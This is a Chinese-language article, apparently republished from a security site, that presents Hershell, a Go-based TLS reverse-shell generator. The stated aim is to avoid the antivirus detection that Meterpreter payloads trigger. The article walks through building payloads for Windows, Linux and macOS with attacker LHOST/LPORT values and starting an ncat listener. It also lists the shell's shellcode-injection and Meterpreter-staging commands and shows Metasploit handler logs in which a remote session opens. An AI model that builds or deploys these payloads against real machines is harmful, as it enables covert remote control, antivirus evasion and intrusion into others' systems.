**Hershell是一款功能强大的跨平台反向Shell生成器，该工具使用Go语言开发，基于TCP反向Shell实现其功能。**

该工具使用了TLS来保障数据通讯的安全性，并且提供了证书公共密钥指纹绑定功能来防止通信数据被拦截。

![](https://image.3001.net/images/20200205/1580906584_5e3ab858479a4.png!small)

## 支持的系统

Hershell的当前版本支持以下操作系统：

> Windows
>
> Linux
>
> macOS
>
> FreeBSD

### 开发目的

> 虽然Meterpreter
> Payload有时也能用，但是这种方法很容易被反病毒产品检测到。因此，Hershell便应运而生，它可以给我们提供一个基于TCP的反向Shell，而且能够支持各种不同的操作系统平台。

## 工具使用&依赖组件

Hershell使用Go语言开发，我们首先需要按照Go官方手册【[
_点我获取_](https://golang.org/doc/install)】在我们的设备上完成Go环境的搭建，并设置好$GOPATH环境变量。

接下来，运行下列命令来获取项目源码：

    
    
    go get github.com/lesnuages/hershell

### 构建Payload

在构建Payload时，我们可以选择使用已提供的Makefile来完成构建。此时，我们需要设置以下环境变量：

> GOOS : 目标操作系统
>
> GOARCH : 目标架构
>
> LHOST : 攻击者IP或主机域名
>
> LPORT : 监听器端口

关于GOOS和GOARCH变量的设置，可以参考这篇【[文档](https://golang.org/doc/install/source#environment)】。

当然了，我们也在Makefile中提供了一些可供参考的变量值：

> depends : 生成服务器证书（反向Shell需要使用到）
>
> windows32 : 构建一个32位Windows可执行程序（PE 32位）
>
> windows64 : 构建一个64位Windows可执行程序（PE 64位）
>
> linux32 : 构建一个32位Linux可执行程序（ELF 32位）
>
> linux64 : 构建一个64位Linux可执行程序（ELF 64位）
>
> macos32 : 构建一个32位macOS可执行程序（Mach-O）
>
> macos64 : 构建一个64位macOS可执行程序（Mach-O）

针对上述列表中的目标平台，我们还需要设置LHOST和LPORT这两个环境变量。

### 使用反向Shell

代码开始执行之后，工具将给我们提供一个远程Shell，它是一个自定义的交互式Shell，允许我们通过Windows上的cmd.exe或Unix设备中的/bin/sh来执行系统命令。

Hershell支持的部分特定命令如下表所示：

run_shell : 获取系统Shell

inject <base64 shellcode> : 向相同进程内存中注入一个shellcode（Base64编码），并执行代码。

meterpreter [tcp|http|https] IP:PORT
:与多个处理器建立连接并从Metasploit获取第二阶段的反向TCP、HTTP或HTTPS
Meterpreter，然后在内存中执行Shellcode（该功能目前仅支持Windows平台）。

exit : 退出程序

## 工具使用

首先，我们需要使用下面的命令生成一个有效的证书：

    
    
    $ make depends
    openssl req -subj '/CN=yourcn.com/O=YourOrg/C=FR' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout server.key -out server.pem
    Generating a 4096 bit RSA private key
    ....................................................................................++
    .....++
    writing new private key to 'server.key'
    -----    cat server.key >> server.pem

### 针对Windows平台：

    
    
    # Predifined 32 bit target
    $ make windows32 LHOST=192.168.0.12 LPORT=1234
    # Predifined 64 bit target
    $ make windows64 LHOST=192.168.0.12 LPORT=1234

### 针对Linux平台：

    
    
    # Predifined 32 bit target
    $ make linux32 LHOST=192.168.0.12 LPORT=1234
    # Predifined 64 bit target
    $ make linux64 LHOST=192.168.0.12 LPORT=1234

### 针对macOS平台：

    
    
    $ make macos LHOST=192.168.0.12 LPORT=1234

## 工具使用样例

### 基础使用

我们可以使用各种工具来处理传入的连接，比如说：

> socat
>
> ncat
>
> openssl服务器模块
>
> Metasploit的各种handler (python/shell_reverse_tcp_ssl payload)

下面是ncat的使用样例：

    
    
    $ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
    Ncat: Version 7.60 ( https://nmap.org/ncat )
    Ncat: Listening on :::1234
    Ncat: Listening on 0.0.0.0:1234
    Ncat: Connection from 172.16.122.105.
    Ncat: Connection from 172.16.122.105:47814.
    [hershell]> whoami
    desktop-3pvv31a\lab

### Meterpreter场景

注意：目前该功能仅支持在Windows平台上使用。

该工具的Meterpreter使用场景目前仅支持下列Payload：

> windows/meterpreter/reverse_tcp
>
> windows/x64/meterpreter/reverse_tcp
>
> windows/meterpreter/reverse_http
>
> windows/x64/meterpreter/reverse_http
>
> windows/meterpreter/reverse_https
>
> windows/x64/meterpreter/reverse_https

当你选择使用某个Payload之后，别忘了选择正确的传输端口（tcp、http或https）。

MeterpreterHandler使用样例如下：

    
    
    [14:12:45][172.16.122.105][Sessions: 0][Jobs: 0] > use exploit/multi/handler
    [14:12:57][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
    payload => windows/x64/meterpreter/reverse_https
    [14:13:12][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lhost 172.16.122.105
    lhost => 172.16.122.105
    [14:13:15][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set lport 8443
    lport => 8443
    [14:13:17][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > set HandlerSSLCert ./server.pem
    HandlerSSLCert => ./server.pem
    [14:13:26][172.16.122.105][Sessions: 0][Jobs: 0] exploit(multi/handler) > exploit -j
    [*] Exploit running as background job 0.
    
    [*] [2018.01.29-14:13:29] Started HTTPS reverse handler on https://172.16.122.105:8443
    [14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >

接下来，在hershell中，使用meterpreter命令：

    
    
    [hershell]> meterpreter https 172.16.122.105:8443

此时，我们将能够在msfconsole中获取到新的Meterpreter会话：

    
    
    [14:13:29][172.16.122.105][Sessions: 0][Jobs: 1] exploit(multi/handler) >
    [*] [2018.01.29-14:16:44] https://172.16.122.105:8443 handling request from 172.16.122.105; (UUID: pqzl9t5k) Staging x64 payload (206937 bytes) ...
    [*] Meterpreter session 1 opened (172.16.122.105:8443 -> 172.16.122.105:44804) at 2018-01-29 14:16:44 +0100
    
    [14:16:46][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions
    
    Active sessions
    ===============
    
      Id  Name  Type                     Information                            Connection
      --  ----  ----                     -----------                            ----------      1         meterpreter x64/windows  DESKTOP-3PVV31A\lab @ DESKTOP-3PVV31A  172.16.122.105:8443 -> 172.16.122.105:44804 (10.0.2.15)
    
    [14:16:48][172.16.122.105][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
    [*] Starting interaction with 1...
    
    meterpreter > getuid
    Server username: DESKTOP-3PVV31A\lab

## 项目地址

> Hershell：【[ _GitHub传送门_](https://github.com/lesnuages/hershell)】

 *** 参考来源：[
_lesnuages_](https://github.com/lesnuages/hershell)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

